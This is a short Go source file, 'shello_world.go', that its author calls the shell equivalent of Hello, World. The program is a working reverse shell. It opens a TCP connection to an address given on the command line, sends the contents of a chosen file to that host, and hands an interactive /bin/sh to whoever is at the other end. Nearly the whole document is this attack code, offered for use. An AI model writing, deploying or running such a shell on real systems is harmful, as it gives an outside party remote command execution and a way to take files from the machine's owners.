// Program shello_world - The shell equivalent of Hello, World!
package main

/*
 * shello_world.go
 * The shell equivalent of Hello, World!
 * By J. Stuart McMurray
 * Created 20240901
 * Last Modified 20240901
 */

import (
	"log"
	"net"
	"os"
	"os/exec"
)

/*
This is about as simple a shell as can be.  It connects to its first argument
via TCP, sends back its second argument, which should be a file, and spawns a
shell.

It is not great code.

Usage: ./shello_world addr:port filename
*/

func main() {
	/* Connect to the server. */
	c, err := net.Dial("tcp", os.Args[1])
	if nil != err {
		log.Fatalf("Error connecting to server: %s", err)
	}

	/* Send back the file. */
	b, err := os.ReadFile(os.Args[2])
	if nil != err {
		log.Fatalf("Error reading file: %s", err)
	}
	if _, err := c.Write(b); nil != err {
		log.Printf("Error sending file: %s", err)
	}

	/* Spawn a shell. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = c
	sh.Stdout = c
	sh.Stderr = c
	if err := sh.Run(); nil != err {
		log.Fatalf("Shell died: %s", err)
	}
}
